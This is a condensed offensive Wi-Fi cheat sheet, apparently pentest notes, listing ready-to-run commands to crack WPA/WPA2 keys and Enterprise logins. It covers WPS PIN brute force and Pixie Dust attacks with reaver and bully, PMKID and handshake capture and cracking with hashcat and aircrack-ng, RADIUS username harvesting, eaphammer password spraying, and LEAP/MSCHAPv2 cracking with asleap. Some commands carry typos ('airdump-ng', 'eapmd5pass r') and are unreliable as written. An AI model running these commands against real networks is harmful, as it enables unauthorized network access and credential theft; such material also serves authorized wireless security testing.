## WEP - Obsolete Protocol
	wifite
## WPA/WPA2-Personal (PSK)
###	WPS PIN Attack
		Known PINs + Generation Algorithms
			airgeddon.sh -> Known PINs database based attack
		WPS PIN Bruteforce (online)
			reaver -i mon0 -b <MAC_AP> -c <channel> -f -N [-L -d 2] -vv  
			bully mon0 -b <MAC_AP> -c <channel> -S -F -B -v 3
		WPS Pixie Dust Attack (offline)
			reaver -i mon0 -b <MAC_AP> -c <channel> -K -N -vv
			bully mon0 -b <MAC_AP> -d -v 3
		Null PIN attack
			reaver -i mon0 -b <MAC_AP> -c <channel> -f -N -g 1 -vv -p ''
###	PMKID Capture (client-less) & Cracking
hcxdumptool -i mon0 -o capture.pcapng --enable_status=1 -c <channel>
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z capture.16800 capture.pcapng
hashcat -m 16800 capture.16800 -a 0 -w 4 <wordlist>
		Can be automated using:
wifite --pmkid [--pmkid-timeout <sec>]
###	Handshake Capture (req. client) & Cracking
		airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> mon0
aircrack-ng -a 2 -b <AP_MAC> -w <wordlist> <capture>
		Can be automated using:
wifite --wpa [-dict <wordlist>]
WPA/WPA2-Enterprise (MGT)
	RADIUS Usernames Capture
		Wireshark > "Identity" field into EAP Message of type "Response, Identity"
		python crEAP.py -i mon0 -c <channel>
		Only possible when RADIUS Identity is sent in cleartext (EAP-MD5, LEAP, sometimes in weak config of other methods) 
	RADIUS Accounts Bruteforce / Password Spraying
		eaphammer --eap-spray --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
	--essid <target_ESSID> --password <password_to_spray> --user-list <usernames_list>
	LEAP & EAP-MD5 Handshake 
Capture & Cracking
		airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> mon0
eapmd5pass r <capture> -w <wordlist>	# For EAP-MD5
asleap -r <capture> -W <wordlist> # For LEAP (crack MSCHAPv2 challenge/response)
		LEAP & EAP-MD5 are old deprecated EAP methods that transmit client authentication (challenge/response) in cleartext
	MSCHAPv2 Challenge / Response Capture (via Rogue AP) & Cracking
		asleap -C <mschapv2_challenge> -R <mschapv2_response> -W <wordlist>  
# Challenge/response colon-delimited format
		Possible when EAP method is using MSCHAPv2 for client authentication (e.g. PEAPv0(MSCHAPv2), EAP-TTLS(MSCHAPv2))
